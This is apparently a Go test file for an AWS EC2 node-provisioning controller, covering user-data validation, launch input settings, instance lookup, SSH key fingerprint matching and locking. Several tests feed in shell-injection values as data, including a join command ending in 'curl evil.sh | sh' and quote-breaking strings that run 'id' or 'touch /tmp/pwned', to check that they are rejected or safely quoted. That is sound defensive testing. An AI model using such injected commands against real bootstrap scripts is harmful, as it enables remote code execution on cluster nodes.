package aws

import (
	"context"
	"crypto/md5" //nolint:gosec // test mirrors EC2's MD5 fingerprint format
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"fmt"
	"strings"
	"sync"
	"testing"
	"time"

	awssdk "github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"golang.org/x/crypto/ssh"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	k8stypes "k8s.io/apimachinery/pkg/types"

	mlv1alpha1 "dcn.ssu.ac.kr/infra/api/ml/v1alpha1"
)

func TestBuildUserDataE_ReturnsErrorInsteadOfExitScript(t *testing.T) {
	p := baseParams()
	p.NoVPN = true
	if _, err := BuildUserDataE(p); err != nil {
		t.Fatalf("valid params rejected: %v", err)
	}

	bad := p
	bad.KubernetesVersion = "not-a-version"
	if out, err := BuildUserDataE(bad); err == nil || out != "" {
		t.Fatalf("invalid params must return an error and no user-data, got out=%q err=%v", out, err)
	}
	// Legacy wrapper keeps its old failing-script behaviour.
	if BuildUserData(bad) == "" {
		t.Fatal("legacy BuildUserData must still return a (failing) script")
	}

	evil := p
	evil.JoinCommand = "kubeadm join 10.0.0.1:6443 --token a.b; curl evil.sh | sh"
	if _, err := BuildUserDataE(evil); err == nil {
		t.Fatal("join command with shell metacharacters must be rejected")
	}

	badRT := p
	badRT.RuntimeVersion = "1.0'; id; '"
	if _, err := BuildUserDataE(badRT); err == nil {
		t.Fatal("runtime version with quotes must be rejected")
	}
}

func TestBootstrapCredentialsAreQuotedAndLabelIsAWS(t *testing.T) {
	p := baseParams()
	p.NoVPN = true
	p.IsGPUNode = true
	p.RuntimeRegistryUser = "us'er"
	p.RuntimeRegistryToken = "to'ken; touch /tmp/pwned #"
	script, err := renderBootstrapScript(p)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(script, "CNLAB_REGISTRY_TOKEN='to'ken") {
		t.Error("token breaks out of its single quotes")
	}
	if !strings.Contains(script, "provider=AWS") || strings.Contains(script, "provider=OnPrem") {
		t.Error("AWS nodes must be labelled provider=AWS (matches the controller's label)")
	}
	if !strings.Contains(script, "kubeadm reset --force") {
		t.Error("join retry loop must reset between attempts")
	}
	assertBashSyntax(t, script)
}

func TestBuildRunInstancesInput(t *testing.T) {
	np := &mlv1alpha1.NodeProvision{
		ObjectMeta: metav1.ObjectMeta{Name: "worker-1", Namespace: "ns", UID: k8stypes.UID("11111111-2222-3333-4444-555555555555")},
		Spec: mlv1alpha1.NodeProvisionSpec{
			InstanceType: "t3.large",
			AWSConfig:    &mlv1alpha1.AWSConfig{AMI: "ami-1", SubnetID: "subnet-1"},
		},
	}
	in := buildRunInstancesInput(np, "dXNlcmRhdGE=", launchImage{})

	if got := awssdk.ToString(in.ClientToken); got != "np-11111111-2222-3333-4444-555555555555-0" {
		t.Errorf("ClientToken = %q", got)
	}
	if in.MetadataOptions == nil || in.MetadataOptions.HttpTokens != types.HttpTokensStateRequired {
		t.Errorf("IMDSv2 (HttpTokens=required) not enforced: %+v", in.MetadataOptions)
	}
	if in.MetadataOptions.HttpPutResponseHopLimit != nil {
		t.Error("hop limit must stay at the default")
	}
	kinds := map[types.ResourceType]bool{}
	for _, ts := range in.TagSpecifications {
		kinds[ts.ResourceType] = true
		found := map[string]string{}
		for _, tg := range ts.Tags {
			found[awssdk.ToString(tg.Key)] = awssdk.ToString(tg.Value)
		}
		if found[nodeProvisionUIDTag] != string(np.UID) || found["Name"] != "worker-1" {
			t.Errorf("%s tags missing uid/Name: %v", ts.ResourceType, found)
		}
	}
	if !kinds[types.ResourceTypeInstance] || !kinds[types.ResourceTypeVolume] {
		t.Errorf("instance and volume must both be tagged at launch: %v", kinds)
	}

	np.Status.ProvisionRetryCount = 3
	if got := awssdk.ToString(buildRunInstancesInput(np, "dXNlcmRhdGE=", launchImage{}).ClientToken); got != "np-11111111-2222-3333-4444-555555555555-3" {
		t.Errorf("ClientToken must follow the provisioning attempt, got %q", got)
	}

	np.UID = ""
	if in := buildRunInstancesInput(np, "x", launchImage{}); in.ClientToken != nil || len(in.TagSpecifications) != 0 {
		t.Error("without a UID neither ClientToken nor uid tags should be set")
	}
}

type fakeDescribe struct {
	pages []*ec2.DescribeInstancesOutput
	calls int
}

func (f *fakeDescribe) DescribeInstances(_ context.Context, in *ec2.DescribeInstancesInput, _ ...func(*ec2.Options)) (*ec2.DescribeInstancesOutput, error) {
	i := 0
	if in.NextToken != nil {
		fmt.Sscanf(*in.NextToken, "p%d", &i)
	}
	f.calls++
	return f.pages[i], nil
}

func inst(id string, launch time.Time, state types.InstanceStateName) types.Instance {
	return types.Instance{InstanceId: awssdk.String(id), LaunchTime: awssdk.Time(launch), State: &types.InstanceState{Name: state}}
}

func TestFindInstanceIDPaginatesAndSkipsTerminated(t *testing.T) {
	now := time.Now()
	f := &fakeDescribe{pages: []*ec2.DescribeInstancesOutput{
		{Reservations: []types.Reservation{{Instances: []types.Instance{inst("i-dead", now.Add(-3*time.Hour), types.InstanceStateNameTerminated)}}}, NextToken: awssdk.String("p1")},
		{Reservations: []types.Reservation{{Instances: []types.Instance{inst("i-new", now, types.InstanceStateNameRunning)}}}, NextToken: awssdk.String("p2")},
		{Reservations: []types.Reservation{{Instances: []types.Instance{inst("i-old", now.Add(-time.Hour), types.InstanceStateNamePending)}}}},
	}}
	got, err := findInstanceID(context.Background(), f, "uid-1")
	if err != nil {
		t.Fatal(err)
	}
	if got != "i-old" {
		t.Errorf("got %q, want the oldest non-terminated instance i-old", got)
	}
	if f.calls != 3 {
		t.Errorf("expected 3 pages to be fetched, got %d", f.calls)
	}
	if id, _ := findInstanceID(context.Background(), f, ""); id != "" {
		t.Error("empty UID must match nothing")
	}
}

func TestKeyPairMatches(t *testing.T) {
	gen := func() (ssh.PublicKey, []byte) {
		k, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			t.Fatal(err)
		}
		pub, err := ssh.NewPublicKey(&k.PublicKey)
		if err != nil {
			t.Fatal(err)
		}
		return pub, ssh.MarshalAuthorizedKey(pub)
	}
	pubA, wantA := gen()
	_, wantB := gen()

	md5fp := func(k ssh.PublicKey) string {
		der, _ := x509.MarshalPKIXPublicKey(k.(ssh.CryptoPublicKey).CryptoPublicKey())
		sum := md5.Sum(der) //nolint:gosec
		parts := make([]string, len(sum))
		for i, b := range sum {
			parts[i] = fmt.Sprintf("%02x", b)
		}
		return strings.Join(parts, ":")
	}

	if !keyPairMatches(nil, awssdk.String(md5fp(pubA)), wantA) {
		t.Error("MD5 fingerprint of the same key must match")
	}
	if !keyPairMatches(nil, awssdk.String(ssh.FingerprintSHA256(pubA)), wantA) {
		t.Error("SHA256 fingerprint of the same key must match")
	}
	if keyPairMatches(nil, awssdk.String(md5fp(pubA)), wantB) {
		t.Error("fingerprint of a different key must NOT match (pair must be re-imported)")
	}
	if !keyPairMatches(awssdk.String(string(wantA)+" comment"), nil, wantA) {
		t.Error("identical public key text must match regardless of comment")
	}
	if keyPairMatches(awssdk.String(string(wantB)), nil, wantA) {
		t.Error("different public key text must not match")
	}
	if keyPairMatches(nil, nil, wantA) {
		t.Error("nothing to compare must count as mismatch")
	}
}

func TestSleepCtxReturnsOnCancel(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	start := time.Now()
	if err := sleepCtx(ctx, time.Minute); err == nil {
		t.Fatal("expected ctx error")
	}
	if time.Since(start) > time.Second {
		t.Fatal("sleepCtx did not return promptly on cancel")
	}
}

func TestCredentialManagerKeyLockIsPerKey(t *testing.T) {
	m := NewCredentialManager(nil, testLogger())
	a, b := credKey{"ns", "a", "r"}, credKey{"ns", "b", "r"}
	if m.keyLock(a) != m.keyLock(a) {
		t.Error("same key must share one mutex")
	}
	if m.keyLock(a) == m.keyLock(b) {
		t.Error("different keys must not share a mutex")
	}
	var wg sync.WaitGroup
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func() { defer wg.Done(); m.keyLock(a).Lock(); m.keyLock(a).Unlock() }()
	}
	wg.Wait()
}
